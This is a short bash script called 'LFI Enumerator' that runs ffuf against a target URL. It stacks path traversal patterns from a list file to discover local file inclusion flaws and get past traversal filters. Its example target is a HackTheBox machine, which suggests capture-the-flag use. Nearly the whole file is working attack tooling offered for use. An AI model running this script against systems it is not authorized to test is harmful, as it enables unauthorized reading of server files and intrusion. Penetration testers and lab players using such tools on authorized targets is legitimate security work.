#!/bin/bash
#
# LFI Enumerator
# Use Ffuf to discover LFIs at a target, while attempting many different kinds of path traversal filter bypass tricks
# Ex:
# ./lfi-scan.sh http://download.htb/files/download/ 0 3 $COOKIES $WLIST 136,2147 '-e .php,.html,.js,.txt' '/' '%00'
#
# 4wayhandshake (Aug 2023)
#

TARGET=$1       # Ex. http://download.htb/files/download/
MIN=$2          # Min number of traversal pattern applied
MAX=$3          # Max number of traversal pattern applied
COOKIES=$4      # Ex. 'key1=val1; key2=val2'
WLIST=$5        # Filepath to wordlist
FILTERSIZE=$6   # Integer size in bytes to filter for invalid responses
EXT=$7          # Ex '-e ".html,.php,.js"'
INITIAL=$8      # Start of the traversal, if any. ex '/'
FINAL=$9        # End of the path, after the FUZZ, ex '%00'

FUZZ="FUZZ"

if [ "$#" -lt 9 ]; then
    echo "Invalid args provide."
    echo "Usage: $0 <target> <min> <max> <cookies> <wordlist> <filter_size> <extensions> <initial> <final>"
    exit 1
fi

while read T; do 
    for (( i=$MIN; i<$MAX; i++ )); do
        TRAVERSAL=$INITIAL
        for (( j=0; j<$i; j++ )); do
            TRAVERSAL="$TRAVERSAL$T"
        done
        TGT="$TARGET$TRAVERSAL$FUZZ$FINAL"
        echo "Trying: $TGT"
        ffuf -s -w $WLIST:FUZZ -u $TGT -b $COOKIES -t 80 -c -timeout 4 -v -fs $FILTERSIZE $EXT
        echo " "
    done
done < lfi-list.txt
